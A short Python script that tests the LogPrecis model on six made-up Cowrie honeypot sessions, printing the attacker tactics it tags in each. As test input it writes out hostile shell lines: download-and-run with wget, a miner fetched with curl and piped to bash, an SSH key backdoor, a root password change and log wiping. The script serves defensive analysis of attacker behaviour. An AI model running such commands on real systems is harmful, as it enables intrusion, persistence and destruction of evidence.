# Test LogPrecis on a few made-up Cowrie sessions
# pip install transformers torch

from transformers import pipeline

sessions = {
    "1 recon only": "uname -a ; cat /proc/cpuinfo ; free -m ; whoami",
    "2 download and run": "cd /tmp ; wget http://198.51.100.7/bins.sh ; chmod 777 bins.sh ; sh bins.sh",
    "3 ssh key backdoor": "cd ~ ; mkdir .ssh ; echo \"ssh-rsa AAAAB3Nza... mdrfckr\" >> .ssh/authorized_keys ; chmod -R go= ~/.ssh",
    "4 password change": "echo \"root:Xy12abc\" | chpasswd ; passwd -l admin",
    "5 miner + cleanup": "curl -s http://198.51.100.9/xmr.sh | bash ; history -c ; rm -rf /var/log/*",
    "6 harmless": "ls ; pwd ; exit",
}

# mps crashes on my mac, so cpu
model = pipeline(
    "token-classification",
    model="SmartDataPolito/logprecis",
    aggregation_strategy="simple",
    device="cpu",
)

for name, text in sessions.items():
    tags = model(text)
    tactics = [t["entity_group"] for t in tags]
    fingerprint = " -> ".join(dict.fromkeys(tactics))

    print(f"\nSession {name}")
    print(f"  commands:    {text}")
    print(f"  fingerprint: {fingerprint}")
    for t in tags:
        print(f"    {t['entity_group']:<16} {t['score']:.2f}  {t['word']}")
